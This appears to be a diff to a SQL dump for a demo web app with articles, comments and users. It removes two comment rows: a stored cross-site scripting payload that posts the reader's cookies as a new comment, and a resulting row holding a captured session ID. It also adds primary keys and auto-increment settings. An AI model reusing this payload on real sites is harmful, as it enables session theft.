@@ -65,8 +65,6 @@ INSERT INTO `comments` (`id`, `article_id`, `author_id`, `timestamp`, `body`) VA
 (8, 1, 2, 1467821812, 'Great article. The most interesting placeholder text I''ve read in my entire life.'),
 (9, 2, 3, 1467821925, 'This is a great first article. The only thing I can think it''s missing is... any meaning at all.'),
 (10, 1, 1, 1467821937, 'You''re right, Matt.'),
-(0, 2, 1, 1468251161, '\r\n                <script>\r\n                    jQuery.post(\r\n                      "?page=comment.php",\r\n                      {\r\n                        "article_id": 1,\r\n                        "body": "My cookies are: " + document.cookie\r\n                      }\r\n                    )\r\n                </script>\r\n        '),
-(0, 1, 1, 1468251161, 'My cookies are: PHPSESSID=d3njstr9g9k2eeptmbc223p4b2');
 
 -- --------------------------------------------------------
 
@@ -141,6 +139,10 @@ INSERT INTO `users` (`id`, `username`, `password`, `role`, `hint`, `salt`) VALUE
 --
 ALTER TABLE `users`
  ADD PRIMARY KEY (`id`), ADD UNIQUE KEY `username` (`username`), ADD KEY `role` (`role`);
+ALTER TABLE `articles`
+ ADD PRIMARY KEY (`id`);
+ALTER TABLE `comments`
+ ADD PRIMARY KEY (`id`);
 
 --
 -- AUTO_INCREMENT for dumped tables
@@ -151,6 +153,10 @@ ALTER TABLE `users`
 --
 ALTER TABLE `users`
 MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=120;
+ALTER TABLE `comments`
+MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
+ALTER TABLE `articles`
+MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;
 /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
 /*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
